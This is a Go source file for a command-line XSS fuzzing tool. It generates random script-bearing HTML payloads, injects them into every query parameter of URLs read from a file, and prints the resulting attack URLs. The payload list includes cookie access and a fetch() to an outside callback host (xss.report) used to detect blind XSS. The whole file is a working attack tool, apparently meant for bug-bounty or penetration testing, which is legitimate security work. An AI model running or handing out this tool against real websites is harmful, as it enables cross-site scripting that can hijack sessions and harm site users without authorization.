package main

import (
        "bufio"
        "flag"
        "fmt"
        "math/rand"
        "net/url"
        "os"
        "time"
)

// HTML tags, JavaScript events, and code snippets for generating XSS payloads
var htmlTags = []string{"div", "img", "script", "iframe", "svg", "input", "a", "body", "p", "span"}
var jsEvents = []string{"onload", "onerror", "onclick", "onmouseover", "onfocus", "onblur", "onmouseout", "ondblclick"}
var jsCodeSnippets = []string{"confirm(1)", "confirm(\"XSS\")", "prompt(1)", "prompt(\"XSS\")", "alert(1)", "alert(\"XSS\")", "console.log(\"XSS\")", "document.cookie", "document.write(\"XSS\")", "fetch(\"https://xss.report/c/vulnhound\")"}
var cssProperties = []string{"color", "background-color", "width", "height", "border"}

// Random string generator for random attribute values
func randomString(n int) string {
        const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        result := make([]byte, n)
        for i := range result {
                result[i] = letters[rand.Intn(len(letters))]
        }
        return string(result)
}

// XSS payload generator
func generateRandomXssPayloads(numberOfPayloads int) []string {
        payloads := make([]string, numberOfPayloads)
        for i := 0; i < numberOfPayloads; i++ {
                tag := htmlTags[rand.Intn(len(htmlTags))]
                event := jsEvents[rand.Intn(len(jsEvents))]
                code := jsCodeSnippets[rand.Intn(len(jsCodeSnippets))]
                randomAttrValue := randomString(10)
                cssProperty := cssProperties[rand.Intn(len(cssProperties))]
                cssValue := fmt.Sprintf("%dpx", rand.Intn(100)+1)

                var attribute string
                if rand.Intn(2) == 0 {
                        attribute = fmt.Sprintf(`style="%s:%s;"`, cssProperty, cssValue)
                } else {
                        attribute = fmt.Sprintf(`%c="%s"`, 'a'+rand.Intn(26), randomAttrValue)
                }

                payloads[i] = fmt.Sprintf(`<%s %s="%s" %s>`, tag, event, code, attribute)
        }
        return payloads
}

// Injects a single XSS payload into a URL's parameters
func injectPayloadIntoUrl(rawUrl, payload string) (string, error) {
        parsedUrl, err := url.Parse(rawUrl)
        if err != nil {
                return "", err
        }

        queryParams := parsedUrl.Query()
        for param := range queryParams {
                queryParams.Set(param, payload)
        }

        parsedUrl.RawQuery = queryParams.Encode()
        return parsedUrl.String(), nil
}

func main() {
        // Parse command-line arguments
        filePath := flag.String("file", "", "Path to a .txt file containing URLs")
        numberOfPayloads := flag.Int("number", 1, "Number of XSS payloads to generate")
        verbose := flag.Bool("verbose", false, "Display verbose output")
        flag.Parse()

        // Seed the random number generator
        rand.Seed(time.Now().UnixNano())

        // Generate the XSS payloads
        payloads := generateRandomXssPayloads(*numberOfPayloads)

        // Read URLs from file if provided
        if *filePath != "" {
                file, err := os.Open(*filePath)
                if err != nil {
                        fmt.Printf("Error opening file: %v\n", err)
                        return
                }
                defer file.Close()

                scanner := bufio.NewScanner(file)
                for scanner.Scan() {
                        url := scanner.Text()

                        if *verbose {
                                fmt.Printf("Original URL: %s\n", url)
                        }

                        for idx, payload := range payloads {
                                injectedUrl, err := injectPayloadIntoUrl(url, payload)
                                if err != nil {
                                        fmt.Printf("Error injecting payload into URL: %v\n", err)
                                        continue
                                }

                                if *verbose {
                                        fmt.Printf("Injected URL %d: %s\n", idx+1, injectedUrl)
                                } else {
                                        fmt.Println(injectedUrl)
                                }
                        }
                }

                if err := scanner.Err(); err != nil {
                        fmt.Printf("Error reading file: %v\n", err)
                }
        } else {
                // Print the payloads if no file is provided
                for idx, payload := range payloads {
                        fmt.Printf("Payload %d: %s\n", idx+1, payload)
                }
        }
}
